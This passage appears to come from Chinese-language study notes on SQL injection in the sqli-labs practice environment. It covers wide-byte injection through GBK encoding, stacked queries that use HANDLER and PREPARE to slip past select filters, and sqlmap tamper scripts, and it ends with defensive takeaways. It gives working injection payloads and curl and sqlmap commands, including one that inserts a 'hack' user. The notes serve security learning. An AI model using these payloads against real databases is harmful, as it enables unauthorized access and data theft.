## 三、组合技案例

### 3.1 宽字节注入（%bf%27）

服务端 `addslashes` 把 `'` 变成 `\'`，但数据库连接是 GBK 编码时：

```text
输入: %bf%27
addslashes 处理: %bf%5c%27   （' → \'）
GBK 解码: %bf%5c 合成一个合法汉字 "縗" → 反斜杠被吃掉
剩余: 縗' → 单引号成功逃逸！
```

payload 示例（less-32）：

```bash
curl -s "http://127.0.0.1/sqli-labs/Less-32/?id=-1%bf%27%20union%20select%201,database(),3%23"
# %bf 可换成 %df/%fe 等与 0x5c 组成合法 GBK 双字节的任意首字节
```

前提条件：`SET NAMES gbk` 或连接编码为 GBK/big5 等多字节编码；utf8mb4 下不成立。

宽字节与 [[04-二次注入|二次注入]] 的关系：addslashes 在两种场景下都被证明"转义不是净化"——一个用编码错位当场绕过，一个等下一次拼接时自然失效。

### 3.2 堆叠注入（handler 绕过 select 过滤）

less-38 起 `mysqli_multi_query()` 允许分号多语句。当 `select` 关键字被彻底过滤时，用 handler 语句读表——handler 不含 select 字样且逐行取数效率更高：

```sql
-- 正常堆叠: 新建一条语句
1'; insert into users(id,username,password) values(100,'hack','hack')#

-- select 被全禁时的替代: handler 扫描
1'; handler users open as h;#
1'; handler h read first;#          -- 取第一行
1'; handler h read next;#           -- 逐行翻页
```

注意：handler 需要每条请求独立执行（open 的句柄在同连接内有效），CTF 页面若每次请求新建连接，需要一次请求内完成 open+read。

堆叠的其他玩法：

```sql
1'; show databases;#                 -- 列库（show 不含 select）
1'; show tables from security;#
1'; desc users;#                     -- 拿列名
1'; set @sql=concat('sel','ect * from users');prepare s from @sql;execute s;#
-- 拆词构造被过滤的关键字（预编译动态拼接）
```

### 3.3 预编译绕过提一嘴

预编译并非绝对安全，两个已知边界：

```sql
-- 1. PREPARE 动态拼接: SQL 语句本身由字符串构造时仍可注入
SET @sql = concat('SELECT * FROM users WHERE id=', @input);
PREPARE stmt FROM @sql;
EXECUTE stmt;
-- @input 可控 = 注入点

-- 2. ORDER BY/LIMIT 位置无法参数化
-- 列名/关键字只能白名单映射解决（见 [[07-ORDER_BY注入]]）
```

## 四、sqlmap tamper 提一嘴

手工绕过验证成功后交给 sqlmap 自动化，配套 tamper 一览：

| tamper | 作用 | 对应章节 |
|--------|------|---------|
| space2comment | 空格 → `/**/` | [[05-过滤空格\|05]] |
| space2plus | 空格 → `+` | [[05-过滤空格\|05]] |
| between | `>` → `between`，`=→ like 类变形` | [[06-AND_OR注入\|06]] |
| equaltolike | `=` → `like` | [[06-AND_OR注入\|06]] |
| randomcase | 大小写混淆 | 区分大小写过滤 |
| base64encode | 参数整体 base64 | [[01-Cookie注入\|01]] less-21/22 |
| unmagicquotes | 宽字节 `%bf%27` + 注释替换 | 宽字节组合技 |
| charencode | URL 编码混淆 | WAF 解码层数不足 |

```bash
# 组合示例: 空格+and/or 过滤的自动化
sqlmap -u "http://127.0.0.1/sqli-labs/Less-25/?id=1" \
       --dbms=mysql --tamper=space2comment,between --batch --threads=4

# base64 Cookie 场景
sqlmap -u "http://127.0.0.1/sqli-labs/Less-21/" \
       --cookie="uname=*" --tamper=base64encode --dbms=mysql

# 查看全部 tamper 及其说明
sqlmap --list-tampers
```

选择 tamper 的原则：**先手工确认服务端过滤了什么，再挑对应 tamper**——盲目堆 tamper 反而让 payload 变形后失效。

### 核心要点回顾

| 要点 | 一句话 |
|------|--------|
| 三步法不变 | 闭合 → 构造 → 提数据，任何场景先找闭合方式 |
| 先判回显再选武器 | 回显位→union；报错→updatexml；差异→布尔；全无→时间/带外 |
| 黑名单必有缝隙 | 双写、编码、符号、替代视图，过滤只是增加成本 |
| 转义不是净化 | 宽字节与二次注入都源于此 |
| 参数化是终点 | 所有防御殊途同归：prepared statement + 白名单 + 最小权限 |
